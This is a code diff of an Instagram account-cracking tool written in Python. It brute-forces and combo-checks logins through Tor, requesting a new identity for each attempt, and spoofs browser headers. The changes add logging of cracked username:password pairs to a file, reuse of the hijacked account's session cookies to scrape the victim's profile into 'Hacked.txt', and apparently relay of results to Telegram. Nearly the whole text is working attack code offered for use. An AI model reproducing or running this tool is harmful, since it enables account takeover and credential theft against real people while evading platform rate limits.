@@ -1,21 +1,22 @@
+import requests
 import random
 from uuid import uuid4
-import secrets
-import requests
-from colored import fg
 from time import sleep
 from stem import Signal
 from stem.control import Controller
-green = fg(2)
-red = fg(1)
-orng = fg(172)
-white = fg(15)
+from fake_useragent import UserAgent
+ua = UserAgent()
+green = "\033[1;32m"
+red = "\033[0;31m"
+orng = "\033[0;33m"
+white = "\033[0;37m"
+blue = '\033[1;34m'
 secure = 'challenge_required'
 errorPas = 'The password you entered is incorrect';loginm = 'logged_in_user'
 wit = 'Please wait a few minutes before you try again'
 #input("Enter proxy file\n>>")
 # prox = open(proxy_file,"r").read().splitlines()
-print(green+
+print(blue+
 '''	
 ############################################################# 
 ###################################################   ####### 
@@ -49,22 +50,62 @@ def send_Tele(tokin,idd,text):
 
 
 def get_inf(user,passs,ask,tokin,iddd):
-        cookie = secrets.token_hex(8)*2
+        f=open('combo.txt','a+')
+        f.write(user+":"+passs+"\n")
+        f.close
+        with Controller.from_port(port=9051) as controller:
+                controller.authenticate(password=passlinux)
+                controller.signal(Signal.NEWNYM)
+        reqw =requests.session()
+
+        hea1={
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-length': '260',
+        'content-type': 'application/x-www-form-urlencoded',
+        'cookie': '',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/',
+        'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
+        'x-csrftoken': 'iTYeYhufyGIoiWfdZyVynUNqAZXEYwYa',
+        'x-ig-app-id': '936619743392459',
+        'x-ig-www-claim': 'hmac.AR1YqJ0hFbUnWM-gjFA6mkgUOSGJPdbRX__xA5Y8AwY3Wcuj',
+        'x-instagram-ajax': '2be71da717d9',
+        'x-requested-with': 'XMLHttpRequest'
+        }
+        loginurl = 'https://www.instagram.com/accounts/login/ajax/'
+        data = {
+                            'username': user,
+                            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + passs}
+        reqw.post(loginurl, data=data, headers=hea1, proxies={'http': 'socks5://127.0.0.1:9050'})
+        csrftoken = reqw.cookies["csrftoken"]
+        user_id = reqw.cookies["ds_user_id"]
+        ccc = reqw.cookies["sessionid"]
+        mid = reqw.cookies['mid']
         head = {
-        'HOST': "www.instagram.com",
-        'KeepAlive' : 'True',
-        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
-        'Cookie': 'cookie',
-        'Accept' : "*/*",
-        'ContentType' : "application/x-www-form-urlencoded",
-        "X-Requested-With" : "XMLHttpRequest",
-        "X-IG-App-ID": "936619743392459",
-        "X-Instagram-AJAX" : "missing",
-        "X-CSRFToken" : "missing",
-        "Accept-Language" : "en-US,en;q=0.9"
-}
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6',
+        'cache-control': 'max-age=0',
+        'Cookie': f'mid={mid}; ig_did=32C9BCA7-A7F6-4D5F-80F7-596D67C4F188; ig_nrcb=1; csrftoken={csrftoken}; ds_user_id={user_id}; sessionid={ccc}; shbid="5229\05446013660744\0541666498683:01f71ba8c2466f6be989dbea67070fe8ef578bc1d51adea3d58084a72952fcf0257da263"; shbts="1634962683\05446013660744\0541666498683:01f787f9c05a096a121e736e679c71576dea6782fc81e47eeaaf5df77d0cd0c9a87c5215"; rur="CLN\05446013660744\0541666498836:01f737e831efcee55642f6f65337a3ab4d881dbf5af1fac49a08e27af5cc61f6f59ab8ca"',
+        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'none',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': ua['google chrome'],}
+        
         url_id = f'https://www.instagram.com/{user}/?__a=1'
-        req_id= requests.get(url_id,headers=head).json()
+        req_id= requests.get(url_id,headers=head, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True).json()
         name    = str(req_id['graphql']['user']['full_name'])
         id    = str(req_id['graphql']['user']['id'])
         followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
@@ -83,9 +124,10 @@ def get_inf(user,passs,ask,tokin,iddd):
 • id : {idd}
 • followers : {followes}
 • following  : {following}
-• date : {dat}
+• Date : {dat}
 • bio : {bio}
 = = = = = = = = = = = = = = = = = =
+By : @Abdullah_Coder
  """)
         f = open("Hacked.txt",'a+')
         f.write(shug+"\n")
@@ -187,14 +229,13 @@ def login(ask,tokin,idd,key):
                 controller.authenticate(password=passlinux)
                 controller.signal(Signal.NEWNYM)
             try:
-                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'http://127.0.0.1:8118'}, allow_redirects=True)
+                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                 if loginm in get.text:
                     userQ = get.json()['logged_in_user']['username']
                     lo +=1
-                    if(ask == "Y" or ask == "y"):
-                        print(green+get_inf(userQ,passs,ask,tokin,idd))
-                    else:
-                        print(green+get_inf(userQ,passs,ask))
+                    
+                    print(green+get_inf(userQ,passs,ask,tokin,idd))
+
                 elif errorPas in get.text:          
                     no +=1
                     print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
@@ -214,7 +255,7 @@ def login(ask,tokin,idd,key):
                     no +=1
                     print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
             except:
-                print(red+"ERROR in proxy\n",end="\r")
+                print(red+"ERROR",end="\r")
 
         except:
             pass
@@ -292,14 +333,14 @@ def brute_pass():
                         controller.authenticate(password=passlinux)
                         controller.signal(Signal.NEWNYM)
                     try:
-                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'http://127.0.0.1:8118'}, allow_redirects=True)
+                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                         if loginm in get.text:
                             userQ = get.json()['logged_in_user']['username']
                             print(green + f"Done login username = {userQ} || password = {passs}")
                             input("Enter to exit")
                             exit
                         elif errorPas in get.text:          
-                            print(red + f"Faild login || Checked Num ({nm})")
+                            print(red + f"Faild login || Checked Num ({nm})",end="\r")
                         elif secure in get.text:
                             print(orng + f"secure username = {user} || password = {passs} || Checked Num ({nm})",end="\r")
 
@@ -377,14 +418,11 @@ def combo_user_pass():
                         controller.authenticate(password=passlinux)
                         controller.signal(Signal.NEWNYM)
                     try:
-                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'http://127.0.0.1:8118'}, allow_redirects=True)
+                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                         if loginm in get.text:
                             userQ = get.json()['logged_in_user']['username']
-                            lo +=1
-                            if(ask == "Y" or ask == "y"):
-                                print(green+get_inf(userQ,passs,ask,tokin,idd))
-                            else:
-                                print(green+get_inf(userQ,passs,ask))
+                            lo +=1      
+                            print(green+get_inf(userQ,passs,ask,tokin,idd))
                         elif errorPas in get.text:          
                             no +=1
                             print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
@@ -442,21 +480,19 @@ def get_information():
                             '_csrftoken':'missing', 
                             'login_attempt_countn':'0',}
                 # pro = random.choice(prox)
-                try:
-                    with Controller.from_port(port=9051) as controller:
+                
+
+                with Controller.from_port(port=9051) as controller:
                         controller.authenticate(password=passlinux)
                         controller.signal(Signal.NEWNYM)
-                    try:
-                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'http://127.0.0.1:8118'}, allow_redirects=True)
-                        if loginm in get.text:
+
+                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
+                if loginm in get.text:
                             userQ = get.json()['logged_in_user']['username']
                             print(green+get_inf(userQ,passs,"n","t","o"))
-                        else:
+                else:
                             print(red + f"Faild login")
-                    except:
-                        print("ERROR in login\n--------------------------------------")
-                except:
-                    pass
+                    
 
 def main():
     while True:
